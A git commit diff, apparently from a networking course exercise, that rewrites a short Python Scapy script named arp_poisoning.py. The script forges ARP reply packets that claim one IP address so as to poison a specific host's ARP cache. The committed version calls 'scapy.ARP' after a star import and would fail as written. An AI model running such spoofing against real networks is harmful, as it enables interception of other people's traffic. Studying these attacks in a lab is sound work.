18d13e514267adcd5f69b64577840d3c203860b8
badusch <vincent.badusch@gmail.com>
2024-10-18 12:28:10 +0200

    tp4

--- arp_poisoning.py
+++ arp_poisoning.py
@@ -1,16 +1,6 @@
-
-from scapy.all import ARP, Ether, send
-
-
-stan_ip = "10.33.67.174"
-
-mac_stan = "f2:39:c5:c0:07:e5"
-
-mon_ip = "10.33.73.77"  
+from scapy.all import *
 
 
-arp_response = ARP(op=2, pdst=stan_ip, psrc=mon_ip, hwdst=mac_stan)
-ether = Ether(dst=mac_stan) / arp_response
-
-
-send(ether, verbose=0)
+def spoofing():
+    packet = scapy.ARP(op=2, hwdst="f2:39:c5:c0:07:e5", pdst="10.33.67.174", psrc="10.33.73.77", hwsrc="98:8D:46:C4:FA:E5")
+    scapy.send(packet, verbose=False)
